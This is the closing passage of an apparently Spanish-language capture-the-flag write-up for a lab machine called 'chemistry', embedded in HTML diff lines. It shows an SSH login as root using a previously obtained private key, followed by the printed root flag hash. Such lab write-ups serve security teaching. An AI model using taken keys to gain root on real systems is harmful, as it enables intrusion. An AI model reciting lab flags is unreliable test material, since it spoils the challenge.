+</span></span></code></pre></div><p>Ahora solo lo que tenemos que hacer es conectarnos por [[SSH]] como [[Root]].</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>rosa@chemistry:/tmp$ ssh -i id_rsa root@10.10.11.38
+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 20.04.6 LTS <span style="color:#f92672">(</span>GNU/Linux 5.4.0-196-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Omiti el Texto que proporciona SSH</span>
+</span></span><span style="display:flex;"><span>root@chemistry:~# cat root.txt 
+</span></span><span style="display:flex;"><span>3343c681d871dfc80713a675982e3c84
+</span></span></code></pre></div><hr>
+
+        </article>
+
+        <footer style="margin-top: 40px; text-align: center; color: #444; font-size: 0.8em;">
+            <p>_ Terminando sesión... exit</p>
+        </footer>
+    </div>
+</body>
+</html>
